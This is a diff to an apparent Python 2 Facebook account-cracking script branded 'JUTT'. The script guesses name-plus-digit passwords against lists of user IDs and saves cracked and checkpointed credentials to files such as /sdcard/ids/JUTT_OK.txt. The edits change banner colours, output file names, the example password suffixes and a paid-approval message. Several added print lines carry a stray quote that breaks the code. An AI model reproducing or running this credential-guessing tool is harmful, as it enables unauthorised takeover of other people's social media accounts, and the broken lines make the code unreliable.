@@ -32,7 +32,7 @@ def reg():
     os.system('clear')
     print logo
     print ''
-    print '\x1b[1;31;1mTake The Free Approval For Login'
+    print '\x1b[1;31;1mTake The Approval For Login Charges 350'
     print ''
     time.sleep(1)
     try:
@@ -444,7 +444,7 @@ def a_s():
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass1
+                print '\x1b[1;94m[JUTT-CP] \x1b[1;91m' ' + uid + ' | ' + pass1
                 cp = open('JUTT_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -460,7 +460,7 @@ def a_s():
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass2
+                    print '\x1b[1;94m[JUTT-CP] \x1b[1;91m' ' + uid + ' | ' + pass2
                     cp = open('JUTT_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -476,7 +476,7 @@ def a_s():
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass3
+                        print '\x1b[1;94m[JUTT-CP] \x1b[1;91m' ' + uid + ' | ' + pass3
                         cp = open('JUTT_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -492,7 +492,7 @@ def a_s():
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass4
+                            print '\x1b[1;94m[JUTT-CP] \x1b[1;91m' ' + uid + ' | ' + pass4
                             cp = open('JUTT_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
@@ -508,7 +508,7 @@ def a_s():
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in q['error']:
-                                print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass5
+                                print '\x1b[1;94m[JUTT-CP] \x1b[1;91m' ' + uid + ' | ' + pass5
                                 cp = open('JUTT_CP.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
@@ -524,7 +524,7 @@ def a_s():
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'www.facebook.com' in q['error']:
-                                    print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass6
+                                    print '\x1b[1;94m[JUTT-CP] \x1b[1;91m' ' + uid + ' | ' + pass6
                                     cp = open('JUTT_CP.txt', 'a')
                                     cp.write(uid + ' | ' + pass6 + '\n')
                                     cp.close()
@@ -540,7 +540,7 @@ def a_s():
                                         ok.close()
                                         oks.append(uid + pass7)
                                     elif 'www.facebook.com' in q['error']:
-                                        print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass7
+                                        print '\x1b[1;94m[JUTT-CP] \x1b[1;91m' ' + uid + ' | ' + pass7
                                         cp = open('JUTT_CP.txt', 'a')
                                         cp.write(uid + ' | ' + pass7 + '\n')
                                         cp.close()
@@ -556,7 +556,7 @@ def a_s():
                                             ok.close()
                                             oks.append(uid + pass8)
                                         elif 'www.facebook.com' in q['error']:
-                                            print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass8
+                                            print '\x1b[1;94m[JUTT-CP] \x1b[1;91m' ' + uid + ' | ' + pass8
                                             cp = open('JUTT_CP.txt', 'a')
                                             cp.write(uid + ' | ' + pass8 + '\n')
                                             cp.close()
@@ -572,7 +572,7 @@ def a_s():
                                                 ok.close()
                                                 oks.append(uid + pass9)
                                             elif 'www.facebook.com' in q['error']:
-                                                print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass9
+                                                print '\x1b[1;94m[JUTT-CP] \x1b[1;91m' ' + uid + ' | ' + pass9
                                                 cp = open('JUTT_CP.txt', 'a')
                                                 cp.write(uid + ' | ' + pass9 + '\n')
                                                 cp.close()
@@ -588,7 +588,7 @@ def a_s():
                                                     ok.close()
                                                     oks.append(uid + pass10)
                                                 elif 'www.facebook.com' in q['error']:
-                                                    print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass10
+                                                    print '\x1b[1;94m[JUTT-CP] \x1b[1;91m' ' + uid + ' | ' + pass10
                                                     cp = open('JUTT_CP.txt', 'a')
                                                     cp.write(uid + ' | ' + pass10 + '\n')
                                                     cp.close()
@@ -764,13 +764,13 @@ def c_s():
             q = json.loads(data)
             if 'loc' in q:
                 print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
-                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass1
-                cp = open('HOP_CP.txt', 'a')
+                print '\x1b[1;94m[JUTT-CP] \x1b[1;91m' ' + uid + ' | ' + pass1
+                cp = open('JUTT_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
                 cps.append(uid + pass1)
@@ -779,13 +779,13 @@ def c_s():
                 q = json.loads(data)
                 if 'loc' in q:
                     print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
-                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass2
-                    cp = open('HOP_CP.txt', 'a')
+                    print '\x1b[1;94m[JUTT-CP] \x1b[1;91m' ' + uid + ' | ' + pass2
+                    cp = open('JUTT_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
                     cps.append(uid + pass2)
@@ -794,13 +794,13 @@ def c_s():
                     q = json.loads(data)
                     if 'loc' in q:
                         print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
-                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                        ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass3
-                        cp = open('HOP_CP.txt', 'a')
+                        print '\x1b[1;94m[JUTT-CP] \x1b[1;91m' ' + uid + ' | ' + pass3
+                        cp = open('JUTT_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
                         cps.append(uid + pass3)
@@ -809,13 +809,13 @@ def c_s():
                         q = json.loads(data)
                         if 'loc' in q:
                             print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
-                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                            ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass4
-                            cp = open('HOP_CP.txt', 'a')
+                            print '\x1b[1;94m[JUTT-CP] \x1b[1;91m' ' + uid + ' | ' + pass4
+                            cp = open('JUTT_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
                             cps.apppend(uid + pass4)
@@ -885,7 +885,7 @@ def n_s():
         print logo
         print '\x1b[1;93m ~~~~ Name pass Public cracking ~~~~\x1b[1;91m'
         print 47 * '-'
-        print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'
+        print '\x1b[1;93m For example:12,123,1234,786,1122\x1b[1;91m'
         print 47 * '-'
         pass1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
         pass2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
@@ -951,7 +951,7 @@ def n_s():
         print logo
         print '\x1b[1;93m ~~~~ Name pass File cracking ~~~~\x1b[1;91m'
         print 47 * '-'
-        print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'
+        print '\x1b[1;93m For example:12,123,1234,786,1122\x1b[1;91m'
         print 47 * '-'
         pass1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
         pass2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
@@ -994,7 +994,7 @@ def n_s():
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass1
+                print '\x1b[1;94m[JUTT-CP] \x1b[1;91m' ' + uid + ' | ' + pass1
                 cp = open('JUTT_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -1009,7 +1009,7 @@ def n_s():
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass2
+                    print '\x1b[1;94m[JUTT-CP] \x1b[1;91m' ' + uid + ' | ' + pass2
                     cp = open('JUTT_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -1024,7 +1024,7 @@ def n_s():
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass3
+                        print '\x1b[1;94m[JUTT-CP] \x1b[1;91m' ' + uid + ' | ' + pass3
                         cp = open('JUTT_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -1039,7 +1039,7 @@ def n_s():
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass4
+                            print '\x1b[1;94m[JUTT-CP] \x1b[1;91m' ' + uid + ' | ' + pass4
                             cp = open('JUTT_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
